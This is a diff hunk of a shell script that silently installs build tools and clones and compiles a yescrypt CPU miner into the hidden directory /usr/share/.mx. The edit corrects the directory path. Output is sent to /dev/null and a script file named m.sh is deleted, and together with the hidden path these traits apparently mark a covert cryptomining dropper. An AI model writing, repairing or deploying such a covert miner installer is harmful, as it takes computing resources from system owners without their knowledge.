@@ -3,7 +3,7 @@ rm m.sh
 apt-get install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake -y > /dev/null
 apt-get install make git nano autoconf automake -y > /dev/null
 git clone https://github.com/noncepool/cpuminer-yescrypt.git /usr/share/.mx > /dev/null
-cd /usr/.mx
+cd /usr/share/.mx
 ./autogen.sh
 ./configure CFLAGS="-O3"
 make
